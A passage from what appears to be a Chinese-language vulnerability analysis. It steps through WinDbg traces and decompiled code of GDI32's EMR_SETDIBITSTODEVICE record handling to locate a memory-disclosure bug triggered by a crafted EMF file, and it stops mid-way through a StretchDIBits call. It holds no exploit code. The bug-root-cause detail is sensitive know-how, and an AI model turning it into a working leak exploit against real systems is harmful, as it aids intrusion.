GDI32!MRSETDIBITSTODEVICE::bPlay+0x45:
00007ff8`2a378775&nbsp;e8a6dbffff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;GDI32!MRSETDIBITSTODEVICE::bCheckRecord&nbsp;(00007ff8`2a376320)
0:027&gt;&nbsp;r&nbsp;rcx
rcx=0000002c8f00be8c//检查vaultcli!EMRSETDIBITSTODEVICE结构</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，EMRSETDIBITSTODEVICE结构保存在rcx中，会作为第一个参数传入函数，接下来跟入函数中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:027&gt;&nbsp;p//接下来检查tagEMR的nSize
GDI32!MRSETDIBITSTODEVICE::bCheckRecord+0x6:
00007ff8`2a376326&nbsp;448b4104&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r8d,dword&nbsp;ptr&nbsp;[rcx+4]&nbsp;ds:0000002c`8f00be90=00000078
0:027&gt;&nbsp;dt&nbsp;tagEMR&nbsp;0000002c8f00be8c
vaultcli!tagEMR
&nbsp;&nbsp;&nbsp;+0x000&nbsp;iType&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x50
&nbsp;&nbsp;&nbsp;+0x004&nbsp;nSize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x78
0:026&gt;&nbsp;p
gdi32full!MRSETDIBITSTODEVICE::bCheckRecord+0x2a:
00007ffd`cf88a56a&nbsp;39442430&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[rsp+30h],eax&nbsp;ss:000000bb`06b9f650=00000078
0:027&gt;&nbsp;p//与0x78比较检查nSize
GDI32!MRSETDIBITSTODEVICE::bCheckRecord+0x6:
00007ff8`2a376326&nbsp;448b4104&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r8d,dword&nbsp;ptr&nbsp;[rcx+4]&nbsp;ds:0000002c`8f00be90=00000078
……
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bCheckRecord+0x16://获得vaultcli!EMRSETDIBITSTODEVICE的cbBmiSrc成员变量值
00007ff8`2a376336&nbsp;8b4934&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,dword&nbsp;ptr&nbsp;[rcx+34h]&nbsp;ds:0000002c`8f00bec0=00000028
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bCheckRecord+0x19:
00007ff8`2a376339&nbsp;bab0ffffff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,0FFFFFFB0h
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bCheckRecord+0x1e://与0x0FFFFFFB0作比较，检查cbBmiSrc的上限
00007ff8`2a37633e&nbsp;3bca&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,edx
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bCheckRecord+0x20:
00007ff8`2a376340&nbsp;7343&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jae&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GDI32!MRSETDIBITSTODEVICE::bCheckRecord+0x65&nbsp;(00007ff8`2a376385)&nbsp;[br=0]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">因为代码片段较长，这里我列举了一些片段，主要就是对结构体中的一些成员变量进行检查，比如头部的tagEMR，会检查tagEMR中的nSize，后续还会检查cbBmiSrc（BitmapInfo大小）等等。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">随后继续单步跟踪，会到达bClipped这个函数，这个函数的主要功能就是对EMRSETDIBITSTODEVICE结构体偏移0x8位置的成员，也就是_RECTL进行检查，_RECTL主要是负责这个图像的上下左右边界。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:026&gt;&nbsp;p//传递rbx+8地址值，是个_RECTL对象
gdi32full!MRSETDIBITSTODEVICE::bPlay+0x4e:
00007ffd`cf88dfae&nbsp;488d5308&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdx,[rbx+8]
0:026&gt;&nbsp;p
gdi32full!MRSETDIBITSTODEVICE::bPlay+0x52:
00007ffd`cf88dfb2&nbsp;488bcd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx,rbp
0:026&gt;&nbsp;p
gdi32full!MRSETDIBITSTODEVICE::bPlay+0x55:
00007ffd`cf88dfb5&nbsp;e822caffff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;gdi32full!MF::bClipped&nbsp;(00007ffd`cf88a9dc)
0:026&gt;&nbsp;r&nbsp;rdx
rdx=0000029606a4a0e4
0:026&gt;&nbsp;dt&nbsp;_RECTL&nbsp;0000029606a4a0e4
vaultcli!_RECTL
&nbsp;&nbsp;&nbsp;+0x000&nbsp;left&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0n0
&nbsp;&nbsp;&nbsp;+0x004&nbsp;top&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0n0
&nbsp;&nbsp;&nbsp;+0x008&nbsp;right&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0n15
&nbsp;&nbsp;&nbsp;+0x00c&nbsp;bottom&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0n15
0:027&gt;&nbsp;r&nbsp;rcx
rcx=0000003492ac5280
0:027&gt;&nbsp;dt&nbsp;_RECTL&nbsp;0000003492ac5280+8c//这里偏移+8c是由于pvClientObjGet获取的对象偏移+8c存放的是比较值，具体在函数里体现
vaultcli!_RECTL
&nbsp;&nbsp;&nbsp;+0x000&nbsp;left&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0n-1
&nbsp;&nbsp;&nbsp;+0x004&nbsp;top&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0n-1
&nbsp;&nbsp;&nbsp;+0x008&nbsp;right&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0n17
&nbsp;&nbsp;&nbsp;+0x00c&nbsp;bottom&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0n17</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在rcx寄存器，也就是第一个参数中存放的是上下左右的界限，而第二个参数则是我们当前图像的RECTL，我们来看一下bClipped检查的伪代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">__int64&nbsp;__fastcall&nbsp;MF::bClipped(MF&nbsp;*this,&nbsp;struct&nbsp;ERECTL&nbsp;*a2)//this指针是pvClientObjGet对象，a2是RECTL对象，这两个对象对应偏移之间会有一个检查，检查当前RECTL对象是否在符合条件的范围内
{
&nbsp;&nbsp;v2&nbsp;=&nbsp;ERECTL::bEmpty(a2);//先判断要判断的地址非空
&nbsp;&nbsp;v5&nbsp;=&nbsp;0;
&nbsp;&nbsp;if&nbsp;(&nbsp;v2&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;0i64;
&nbsp;&nbsp;}
&nbsp;&nbsp;else
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;*(_DWORD&nbsp;*)(v4&nbsp;+&nbsp;140)&nbsp;&gt;&nbsp;*(_DWORD&nbsp;*)(v3&nbsp;+&nbsp;8)//检查上下左右是否符合要求
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;||&nbsp;*(_DWORD&nbsp;*)(v4&nbsp;+&nbsp;148)&nbsp;&lt;&nbsp;*(_DWORD&nbsp;*)v3
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;||&nbsp;*(_DWORD&nbsp;*)(v4&nbsp;+&nbsp;144)&nbsp;&gt;&nbsp;*(_DWORD&nbsp;*)(v3&nbsp;+&nbsp;12)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;||&nbsp;*(_DWORD&nbsp;*)(v4&nbsp;+&nbsp;152)&nbsp;&lt;&nbsp;*(_DWORD&nbsp;*)(v3&nbsp;+&nbsp;4)&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v5&nbsp;=&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;(unsigned&nbsp;int)v5;
&nbsp;&nbsp;}
&nbsp;&nbsp;return&nbsp;result;
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在函数中当RECTL对象不为空时，会和标准对象的上下左右进行比较，看是否超出界限大小（在else语句逻辑中），随后如果满足在标准大小范围内，返回为1，程序会继续执行。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">接下来程序会分别进入三个函数逻辑，这三个函数逻辑和HDC相关。详细请参照我的注释。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0x68://获取xDest，x轴值
00007ff8`2a378798&nbsp;8b4318&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[rbx+18h]&nbsp;ds:0000002c`8f00bea4=00000000
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0x6b:
00007ff8`2a37879b&nbsp;488d9424a0000000&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdx,[rsp+0A0h]
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0x73:
00007ff8`2a3787a3&nbsp;898424a0000000&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[rsp+0A0h],eax&nbsp;ss:00000034`93cef700=00000008
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0x7a:
00007ff8`2a3787aa&nbsp;41b801000000&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r8d,1
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0x80://获取yDest，y轴值
00007ff8`2a3787b0&nbsp;8b431c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[rbx+1Ch]&nbsp;ds:0000002c`8f00bea8=00000000
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0x83:
00007ff8`2a3787b3&nbsp;898424a4000000&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[rsp+0A4h],eax&nbsp;ss:00000034`93cef704=00000000
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0x8a://获取hdc
00007ff8`2a3787ba&nbsp;488b8dd8020000&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx,qword&nbsp;ptr&nbsp;[rbp+2D8h]&nbsp;ss:00000034`92ac5558=ffffffffe90107a2
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0x91://LPtoDP把x、y坐标发给hdc
00007ff8`2a3787c1&nbsp;e8ba87faff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;GDI32!LPtoDP&nbsp;(00007ff8`2a320f80)
……
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0x9a://SetWorldTransform函数为指定的设备上下文在全局空间和页空间之间设置一个二维线性变换。&nbsp;此变换可用于缩放，旋转，剪切或转换图形输出。
00007ff8`2a3787ca&nbsp;488d95c0020000&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdx,[rbp+2C0h]
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0xa1:
00007ff8`2a3787d1&nbsp;41b804000000&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r8d,4
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0xa7:
00007ff8`2a3787d7&nbsp;498bcf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx,r15
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0xaa:
00007ff8`2a3787da&nbsp;e8815cf8ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;GDI32!ModifyWorldTransform&nbsp;(00007ff8`2a2fe460)
0:027&gt;&nbsp;r&nbsp;rdx
rdx=0000003492ac5540
0:027&gt;&nbsp;dt&nbsp;XFORM&nbsp;0000003492ac5540//线形变换参数
vaultcli!XFORM
&nbsp;&nbsp;&nbsp;+0x000&nbsp;eM11&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0.9870000482&nbsp;
&nbsp;&nbsp;&nbsp;+0x004&nbsp;eM12&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0&nbsp;
&nbsp;&nbsp;&nbsp;+0x008&nbsp;eM21&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0&nbsp;
&nbsp;&nbsp;&nbsp;+0x00c&nbsp;eM22&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0.9893333316&nbsp;
&nbsp;&nbsp;&nbsp;+0x010&nbsp;eDx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0&nbsp;
&nbsp;&nbsp;&nbsp;+0x014&nbsp;eDy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0&nbsp;
……
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0xb3://获取cbBmiSrc成员值，负责BITMAP的大小
00007ff8`2a3787e3&nbsp;448b4b34&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r9d,dword&nbsp;ptr&nbsp;[rbx+34h]&nbsp;ds:0000002c`8f00bec0=00000028
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0xb7:
00007ff8`2a3787e7&nbsp;498bd6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdx,r14
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0xba://获得offBmiSrc成员变量值，负责BITMAP的偏移
00007ff8`2a3787ea&nbsp;448b4330&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r8d,dword&nbsp;ptr&nbsp;[rbx+30h]&nbsp;ds:0000002c`8f00bebc=0000004c
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0xbe:
00007ff8`2a3787ee&nbsp;488bcb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx,rbx
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0xc1://主要就是Check&nbsp;tagBITMAPINFO
00007ff8`2a3787f1&nbsp;e852d6faff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;GDI32!MR::bValidOffExt&nbsp;(00007ff8`2a325e48)
0:027&gt;&nbsp;r&nbsp;rdx
rdx=0000002c8f00be8c
0:027&gt;&nbsp;dt&nbsp;tagBITMAPINFO&nbsp;2c8f00be8c+4c
vaultcli!tagBITMAPINFO
&nbsp;&nbsp;&nbsp;+0x000&nbsp;bmiHeader&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;tagBITMAPINFOHEADER
&nbsp;&nbsp;&nbsp;+0x028&nbsp;bmiColors&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;[1]&nbsp;tagRGBQUAD
0:027&gt;&nbsp;dt&nbsp;tagBITMAPINFOHEADER&nbsp;2c8f00be8c+4c
vaultcli!tagBITMAPINFOHEADER
&nbsp;&nbsp;&nbsp;+0x000&nbsp;biSize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x28
&nbsp;&nbsp;&nbsp;+0x004&nbsp;biWidth&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0n16
&nbsp;&nbsp;&nbsp;+0x008&nbsp;biHeight&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0n16
&nbsp;&nbsp;&nbsp;+0x00c&nbsp;biPlanes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;1
&nbsp;&nbsp;&nbsp;+0x00e&nbsp;biBitCount&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x18
&nbsp;&nbsp;&nbsp;+0x010&nbsp;biCompression&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0
&nbsp;&nbsp;&nbsp;+0x014&nbsp;biSizeImage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;4
&nbsp;&nbsp;&nbsp;+0x018&nbsp;biXPelsPerMeter&nbsp;&nbsp;:&nbsp;0n0
&nbsp;&nbsp;&nbsp;+0x01c&nbsp;biYPelsPerMeter&nbsp;&nbsp;:&nbsp;0n0
&nbsp;&nbsp;&nbsp;+0x020&nbsp;biClrUsed&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0
&nbsp;&nbsp;&nbsp;+0x024&nbsp;biClrImportant&nbsp;&nbsp;&nbsp;:&nbsp;0</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如注释内容，这三个函数会分别对坐标，线性变换的参数，以及EMRSETDIBITSTODEVICE结构体的BITMAPINFO成员变量进行获取赋值和检查。这些赋值和检查如果成功，都会返回非0值，这样才能继续下面的逻辑，接下来，bPlay函数会为BITMAPINFO开辟地址空间。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0xce:
00007ff8`2a3787fe&nbsp;b8f8040000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,4F8h
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0xd3://获得LocalAlloc的第一个参数nType
00007ff8`2a378803&nbsp;b940000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,40h
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0xd8://判断cbBmiSrc和4f8的大小
00007ff8`2a378808&nbsp;394334&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[rbx+34h],eax&nbsp;ds:0000002c`8f00bec0=00000028
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0xdb://如果大于则将cbBmiSrc的大小作为开辟的空间大小，否则就开辟4f8
00007ff8`2a37880b&nbsp;0f474334&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmova&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[rbx+34h]&nbsp;ds:0000002c`8f00bec0=00000028
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0xdf://获得要开辟空间的大小
00007ff8`2a37880f&nbsp;8bd0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,eax
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0xe1://开辟4f8的bitmapinfo空间
00007ff8`2a378811&nbsp;ff15d9190300&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;qword&nbsp;ptr&nbsp;[GDI32!_imp_LocalAlloc&nbsp;(00007ff8`2a3aa1f0)]&nbsp;ds:00007ff8`2a3aa1f0={KERNELBASE!LocalAlloc&nbsp;(00007ff8`2810fe40)}
0:027&gt;&nbsp;r&nbsp;edx
edx=4f8
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0xe7:
00007ff8`2a378817&nbsp;488bf0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rsi,rax
0:027&gt;&nbsp;r&nbsp;rax
rax=0000003492a637b0//开辟出4f8的空间，并且获取堆指针
0:027&gt;&nbsp;dd&nbsp;3492a637b0&nbsp;l5
00000034`92a637b0&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000
00000034`92a637c0&nbsp;&nbsp;00000000</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在函数中，会对开辟的空间进行一个判断，如果BITMAPINFO的size大于4f8，则开辟BITMAPINFO size大小空间，如果小于的话，则直接开辟4f8空间，开辟后，会将当前EMRSETDIBITSTODEVICE结构体的BITMAPINFO拷贝进去，在EMRSETDIBITSTODEVICE结构体中offBmiSrc是BITMAPINFO距离EMRSETDIBITSTODEVICE结构体的偏移，而cbBmiSrc则是BITMAPINFO的大小。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">根据我们当前的情况，偏移是0x4c，大小是0x28，随后会执行memcpy拷贝BITMAPINFO。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0x100://拷贝bitmapinfo
00007ff8`2a378830&nbsp;e8d34cfbff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;GDI32!memcpy&nbsp;(00007ff8`2a32d508)
0:027&gt;&nbsp;r&nbsp;r8
r8=0000000000000028
0:027&gt;&nbsp;r&nbsp;rdx
rdx=0000002c8f00bed8
0:027&gt;&nbsp;dd&nbsp;2c8f00bed8
0000002c`8f00bed8&nbsp;&nbsp;00000028&nbsp;00000010&nbsp;00000010&nbsp;00180001
0000002c`8f00bee8&nbsp;&nbsp;00000000&nbsp;00000004&nbsp;00000000&nbsp;00000000
0000002c`8f00bef8&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00ed1c24&nbsp;0000000e</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">可以看到，拷贝的内容正是我们EMF文件中对应BITMAPINFO区域的内容，这里要注意，其实这里拷贝的只是BITMAP的信息，而并不是我们真正图像的内容，因此这里还不是造成内存泄露的原因。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">接下来会进行一系列的变量判断，这些变量判断我将在下面的伪代码的注释中给大家讲解，但是这一系列的判断并没有判断引发这个漏洞最关键的部分，随后我们会看到一处关键函数调用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOBYTE(v6)&nbsp;=&nbsp;StretchDIBits(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v3,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pt.x,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pt.y,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;10),//
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;11),
